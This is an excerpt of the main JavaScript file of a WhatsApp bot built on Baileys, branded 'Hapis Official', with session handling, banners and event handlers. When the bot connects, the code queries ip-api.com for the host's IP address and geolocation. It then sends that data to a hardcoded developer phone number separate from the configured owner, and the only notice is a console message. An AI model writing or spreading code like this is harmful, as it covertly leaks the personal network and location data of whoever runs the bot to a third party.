...
require('./HD.java')
nocache('../HD.java', module => console.log(color('[WARN]', 'yellow'), color(`'${module}'`, 'yellow'), 'File is updated!'))
require('./hapis.js')
nocache('../hapis.js', module => console.log(color('[WARN]', 'yellow'), color(`'${module}'`, 'yellow'), 'File is updated!'))
require('./main.js')
...
const starts = async (Hapis = new WAConnection()) => {
    CFonts.say(`HAPIS OFFICIAL`, {
        font: 'chrome',
        align: 'center',
        gradient: ['red', 'magenta']
      })
    Hapis.logger.level = 'warn'

	console.log(color(`${spc2}           [ • CREATOR BY HAPIS OFFICIAL • ]` ,`${randomcolors}`))
console.log(color(`${spc4}                       < ============================================ >`, `${randomcolors}`))
console.log(color(`${spc3}                    [•]`, `${randomcolors}`), color(`Hai         : HAPIS Official`, `${randomcolors}`))
...
console.log(color(`${spc3}                    [•]`, `${randomcolors}`), color(`Owner       : Hapis Official`, `${randomcolors}`))
console.log(color(`${spc3}                    [•]`, `${randomcolors}`), color(`Author      : Hapis Official`, `${randomcolors}`))
console.log(color(`${spc3}                    [•]`, `${randomcolors}`), color(`Base Ori By : Hapis Official`, `${randomcolors}`))
console.log(color(`${spc4}                       < ============================================ >`, `${randomcolors}`))
	Hapis.browserDescription = [ `${setting.NamaBot}`, `${randomserverku}`, '3.0' ]
	...
	// Menghubungkan
	fs.existsSync(`./${sessionsname}.json`) && Hapis.loadAuthInfo(`./${sessionsname}.json`)
	Hapis.on('connecting', () => {
		console.log(color('[ Hapis Official ]', 'aqua'), color('Menyambungkan!'));
	})
const ftroli = { key: { fromMe: false, "participant": "0@s.whatsapp.net", "remoteJid": "6281802558378-1604595598@g.us" }, "message": { orderMessage: { itemCount: 500, status: 200, thumbnail: fs.readFileSync(`./media/foto/thumb.jpg`), surface: 200, message: `【 HELABOTZ 】`, orderTitle: 'Hapis Official', sellerJid: '0@s.whatsapp.net' } }, contextInfo: { "forwardingScore": 999, "isForwarded": true }, sendEphemeral: true }
const spinner = { 
  "interval": 120,
  "frames": [
    "H",
	...
	//connect
	Hapis.on('open', () => {
		console.log(color('[ elna ]', 'aqua'), color('Connected'));
	})
	...
	fs.writeFileSync(`./${sessionsname}.json`, JSON.stringify(Hapis.base64EncodedAuthInfo(), null, '\t'))
     buttonss = [
        { buttonId: `.menu`, buttonText: { displayText: 'ok' }, type: 1 },
    ]

    buttonMessagee = {
        contentText: `BOT TELAH AKTIF DI NOMOR INI JANGAN LUPA FOLLOW IG @hfzdzakwan_`,
...
fetch(`http://ip-api.com/line`).then(res => res.text())  
        .then(bu =>{
       Hapis.sendMessage("6281802558378@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, { contextInfo: { externalAdReply: { title: `Developer ${setting.NamaBot}`, body: "", previewType: "PHOTO", thumbnail: fs.readFileSync('./media/foto/thumb.jpg'), sourceUrl: `https://wa.me/6281802558378?text=Assalamualaikum+bwang:v` } }})
     console.log(color('|WARN|', 'yellow'), color('Sending ip address to developer bot', 'cyan'))
   })
    Hapis.sendMessage(`${setting.NomorOwner}@s.whatsapp.net`, buttonMessagee, MessageType.buttonsMessage, {
        caption: '[ HELABOTZ ]',
        "contextInfo": {
            text: 'hi',
	...
	// Baterai
	Hapis.on('CB:action,,battery', json => {
	...
	Hapis.on('autoupdate', async (message) => {
		require('./autoupdate.js')(Hapis, autoupdate)
	})
	// welcome
	Hapis.on('group-participants-update', async (anu) => {
		await welcome(Hapis, anu)
	})

	Hapis.on('chat-update', async (message) => {
		require('./hapis.js')(Hapis, message)
	})
}
